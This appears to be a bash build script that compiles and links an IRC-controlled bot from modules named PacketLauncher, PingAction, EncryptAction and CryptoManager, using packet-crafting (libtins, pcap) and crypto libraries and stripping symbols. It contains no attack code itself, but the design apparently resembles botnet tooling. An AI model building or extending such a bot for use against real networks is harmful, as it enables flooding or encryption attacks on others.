#!/bin/bash

# Enable or disable features
ENABLE_PING_ACTION=1
ENABLE_ENCRYPT_ACTION=1

# Initialize object file variables
PING_ACTION_OBJ=""
PACKET_LAUNCHER_OBJ=""
ENCRYPT_ACTION_OBJ=""
CRYPTO_MANAGER_OBJ=""

if [ "$ENABLE_PING_ACTION" -eq 1 ]; then
    echo "Compiling PingAction.cpp"
    g++ -std=c++11 -Wall -Wextra -Iinclude -DENABLE_PING_ACTION -c PingAction.cpp -o PingAction.o
    PING_ACTION_OBJ="PingAction.o"
    echo "Compiling PacketLauncher.cpp"
    g++ -std=c++11 -Wall -Wextra -Iinclude -DENABLE_PACKET_LAUNCHER -c PacketLauncher.cpp -o PacketLauncher.o
    PACKET_LAUNCHER_OBJ="PacketLauncher.o"
fi

if [ "$ENABLE_ENCRYPT_ACTION" -eq 1 ]; then
    g++ -std=c++11 -Wall -Wextra -Iinclude -DENABLE_ENCRYPT_ACTION -c EncryptAction.cpp -o EncryptAction.o
    ENCRYPT_ACTION_OBJ="EncryptAction.o"
    g++ -std=c++11 -Wall -Wextra -Iinclude -DENABLE_ENCRYPT_ACTION -c CryptoManager.cpp -o CryptoManager.o
    CRYPTO_MANAGER_OBJ="CryptoManager.o"
fi

# Compile main source files with the same definitions
echo "Compiling main source files"
g++ -std=c++11 -Wall -Wextra -Iinclude -DENABLE_PING_ACTION -DENABLE_ENCRYPT_ACTION -c BotMain.cpp -o BotMain.o
g++ -std=c++11 -Wall -Wextra -Iinclude -DENABLE_PING_ACTION -DENABLE_ENCRYPT_ACTION -c IrcClient.cpp -o IrcClient.o
g++ -std=c++11 -Wall -Wextra -Iinclude -DENABLE_PING_ACTION -DENABLE_ENCRYPT_ACTION -c MessageParser.cpp -o MessageParser.o
g++ -std=c++11 -Wall -Wextra -Iinclude -DENABLE_PING_ACTION -DENABLE_ENCRYPT_ACTION -c GeneralUtils.cpp -o GeneralUtils.o

# Link object files
echo "Linking object files"
g++ BotMain.o IrcClient.o MessageParser.o GeneralUtils.o $PING_ACTION_OBJ $PACKET_LAUNCHER_OBJ $ENCRYPT_ACTION_OBJ $CRYPTO_MANAGER_OBJ -o irc_bot -lcryptopp -lircclient -ltins -lpcap -s

echo "Build finished"
